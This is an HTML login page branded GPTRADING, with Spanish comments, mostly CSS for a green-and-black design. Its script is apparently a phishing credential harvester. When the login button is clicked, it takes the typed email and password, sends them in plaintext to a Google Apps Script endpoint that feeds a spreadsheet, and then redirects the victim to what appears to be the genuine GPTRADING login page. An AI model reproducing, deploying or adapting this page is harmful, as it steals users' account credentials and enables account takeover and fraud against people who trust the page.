<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>GPTRADING Login</title>
<style>
  body {
    margin: 0;
    font-family: 'Arial', sans-serif;
    background: #b6f391; /* verde claro */
    display: flex;
    flex-direction: column;
    height: 100vh;
  }

  /* Franja verde fija arriba */
  .verde {
    height: 5cm; /* altura fija */
    background: #b6f391;
    width: 100%;
  }

  /* Bloque negro con escalones */
  .negro {
    flex: 1; /* ocupa lo que sobra */
    width: 100%;
    background: #000; /* Negro puro */
    clip-path: polygon(
      50% 0,
      calc(100% - 32px) 0,
      calc(100% - 32px) 16px,
      calc(100% - 16px) 16px,
      calc(100% - 16px) 32px,
      100% 32px,
      100% 100%,
      0% 100%,
      0% 32px,
      16px 32px,
      16px 16px,
      32px 16px,
      32px 0,
      50% 0
    );
    display: flex;
    justify-content: center;
    align-items: flex-start;
    padding-top: 80px;
    box-sizing: border-box;
  }

  .login-container {
    width: 380px;
    padding: 20px;
    position: relative;
    z-index: 2;
    background: transparent;
  }

  .green-bg {
    position: absolute;
    top: -170px; 
    left: -30%;  
    width: calc(160% - 37.8px);
    height: 80px; /* Limitado para no invadir debajo de la línea */
    background-color: #90EE90;
    z-index: 0;
    border-radius: 8px;
  }

  /* Contenedor de escalones verdes dinámicos (sin línea verde) */
  .green-steps-container {
    position: absolute;
    top: 0px; 
    left: 50%;
    transform: translateX(-50%);
    height: 32px;
    display: flex;
    gap: 10px; 
    z-index: 1;
  }

  .green-step {
    width: 20px;
    height: 32px;
    background-color: #90EE90;
    clip-path: polygon(
      0 0,
      100% 0,
      100% 50%,
      50% 50%,
      50% 100%,
      0 100%
    );
  }

  .logo {
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 100px 0 20px 0; /* Ajustado para alinear con el segundo HTML */
    position: relative;
    z-index: 2;
  }

  .logo-icon {
    width: 40px; 
    height: 26px; 
    background-color: #000; 
    border: 4px solid #fff; 
    border-radius: 4px;
    position: relative;
    margin-right: 10px;
    display: flex;
    align-items: center;
    justify-content: space-around;
    padding: 0 4px;
  }

  .logo-icon .circle {
    width: 12px; 
    height: 12px; 
    background-color: #fff; 
    border-radius: 50%;
  }

  .logo-icon::after {
    content: '';
    position: absolute;
    bottom: -8px;
    right: 8px;
    width: 0;
    height: 0;
    border-left: 8px solid transparent;
    border-right: 8px solid transparent;
    border-top: 8px solid #fff; 
  }

  .logo-text {
    color: #FFFFFF;
    font-size: 20px;
    font-weight: bold;
  }

  .login-title {
    color: #90EE90;
    font-size: 16px;
    text-align: center;
    margin-bottom: 30px;
  }

  .form-field {
    margin-bottom: 20px;
    position: relative;
  }
  .form-field label {
    color: #FFFFFF;
    font-size: 14px;
    display: block;
    margin-bottom: 5px;
  }
  .form-field label::before {
    content: "* ";
    color: red;
  }
  .form-field input {
    width: 100%;
    padding: 10px 40px 10px 10px;
    background-color: #000;
    border: 2px solid #90EE90;
    color: #FFFFFF;
    font-size: 14px;
    border-radius: 12px;
  }

  .toggle-eye {
    position: absolute;
    right: 10px;
    top: 32px;
    width: 20px;
    height: 20px;
    cursor: pointer;
    fill: #90EE90;
  }

  .forgot-password {
    color: #90EE90; 
    font-size: 12px;
    text-align: right;
    margin-bottom: 20px;
    cursor: pointer;
  }

  .login-button {
    width: 40%;
    padding: 10px;
    background-color: #90EE90; 
    color: #000; 
    font-weight: bold;
    border: 2px solid #90EE90;
    cursor: pointer;
    font-size: 14px;
    border-radius: 12px;
    display: block;
    margin: 0 auto 20px auto;
  }

  .stair {
    position: absolute;
    top: 110px; /* Ajustado 30px hacia abajo desde 80px */
    right: 20px;
    transform: scale(0.5);
    transform-origin: bottom left;
    z-index: 2;
  }
  .step {
    position: absolute;
    width: 12px;
    height: 12px;
    background-color: #90EE90;
  }
  .step:nth-child(1) { top: 1px; left: 0px; }   
  .step:nth-child(2) { top: 13px; left: 0px; }
  .step:nth-child(3) { top: 25px; left: 0px; }  
  .step:nth-child(4) { top: 25px; left: 12px; } 
  .step:nth-child(5) { top: 25px; left: 24px; } 
  .step:nth-child(6) { top: 37px; left: 24px; } 
  .step:nth-child(7) { top: 49px; left: 24px; } 
  .step:nth-child(8) { top: 49px; left: 36px; } 
  .step:nth-child(9) { top: 49px; left: 48px; } 

  .extra-square {
    position: absolute;
    top: 190px; /* Ajustado 30px hacia abajo desde 160px */
    left: -10px;
    width: 16px;
    height: 16px;
    background-color: #90EE90;
    z-index: 2;
  }

  .x-container {
    position: absolute;
    width: 28px;
    height: 28px;
    top: calc(100% - 70px + 37.8px); /* Posición original mantenida */
    left: calc(25px + 37.8px);
    transform: scale(0.9);
  }

  .x-square {
    position: absolute;
    width: 10px;
    height: 10px;
    background-color: #90EE90;
  }
</style>
</head>
<body>

<div class="verde"></div>

<div class="negro">
  <div class="login-container">
    <div class="green-bg"></div>
    <!-- Escalones verdes dinámicos centrados -->
    <div class="green-steps-container"></div>

    <div class="logo">
      <div class="logo-icon">
        <div class="circle"></div>
        <div class="circle"></div>
      </div>
      <div class="logo-text">GPTRADING</div>
    </div>

    <div class="login-title">Login</div>

    <div class="form-field">
      <label for="email">E-mail</label>
      <input type="email" id="email" placeholder="Enter your email" />
    </div>

    <div class="form-field">
      <label for="password">Password</label>
      <input type="password" id="password" placeholder="Enter your password" />
      <svg class="toggle-eye" viewBox="0 0 24 24" onclick="togglePassword()">
        <path id="eye-path" d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 13c-3 0-5.5-2.46-5.5-5.5S9 6.5 12 6.5s5.5 2.46 5.5 5.5S15 17.5 12 17.5z"/>
      </svg>
    </div>

    <div class="forgot-password">I forgot my password</div>

    <button class="login-button">Login</button>

    <div class="x-container">
      <div class="x-square" style="top: 0; left: 0;"></div>
      <div class="x-square" style="top: 0; left: 18px;"></div>
      <div class="x-square" style="top: 9px; left: 9px;"></div>
      <div class="x-square" style="top: 18px; left: 0;"></div>
      <div class="x-square" style="top: 18px; left: 18px;"></div>
    </div>

    <div class="stair">
      <div class="step"></div><div class="step"></div><div class="step"></div>
      <div class="step"></div><div class="step"></div>
      <div class="step"></div><div class="step"></div><div class="step"></div>
      <div class="step"></div>
    </div>

    <div class="extra-square"></div>
  </div>
</div>

<script>
function togglePassword() {
  const password = document.getElementById('password');
  const eye = document.getElementById('eye-path');
  if (password.type === 'password') {
    password.type = 'text';
    eye.setAttribute('d', 'M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5z');
  } else {
    password.type = 'password';
    eye.setAttribute('d', 'M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 13c-3 0-5.5-2.46-5.5-5.5S9 6.5 12 6.5s5.5 2.46 5.5 5.5S15 17.5 12 17.5z');
  }
}

// Enviar datos a Google Sheet y redirigir
const formButton = document.querySelector('.login-button');
formButton.addEventListener('click', function() {
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  const scriptURL = "https://script.google.com/macros/s/AKfycbyveaEsaqUeshTvIEX8GPZZO_CXugoxl7jtlI7kcLsyOaViTCnXXv9Axq-5FTkghreGHw/exec"; // Reemplaza con tu URL de Apps Script
  const redirectURL = "https://app.gptrading.ai/auth/login"; // Reemplaza con tu página de destino

  fetch(scriptURL, {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: email, password: password })
  });

  setTimeout(() => {
    window.location.href = redirectURL;
  }, 2000);
});
</script>

</body>
</html>
